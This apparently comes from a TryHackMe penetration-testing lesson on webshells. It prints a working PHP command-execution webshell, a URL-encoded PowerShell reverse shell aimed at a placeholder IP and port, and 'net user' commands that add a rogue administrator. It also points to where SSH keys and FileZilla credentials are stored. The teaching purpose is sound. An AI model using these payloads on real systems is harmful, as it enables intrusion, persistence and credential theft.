# WebShells

There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a *webshell*. See the [Upload Vulnerabilities Room](https://tryhackme.com/room/uploadvulns) for a more extensive look at this concept.

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.

As PHP is still the most common server side scripting language, let's have a look at some simple code for this.

In a very basic one line format:

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

Let's see this in action:

![](https://assets.tryhackme.com/additional/imgur/W19gHwL.png)

Notice that when navigating the shell, we used a GET parameter "cmd" with the command "ifconfig", which correctly returned the network information of the box. In other words, by entering the `ifconfig` command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. This would work for any other command we chose to use (e.g. `whoami`, `hostname`, `arch`, etc).

As mentioned previously, there are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) -- a full reverse shell written in PHP. Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the `cmd` argument:

```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.

### Next Step

We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`

or `C:\xampp\FileZilla Server\FileZilla Server.xml`

. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

`net user <username> <password> /add`

`net localgroup administrators <username> /add`

---

*The important take away from this task:*

Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target
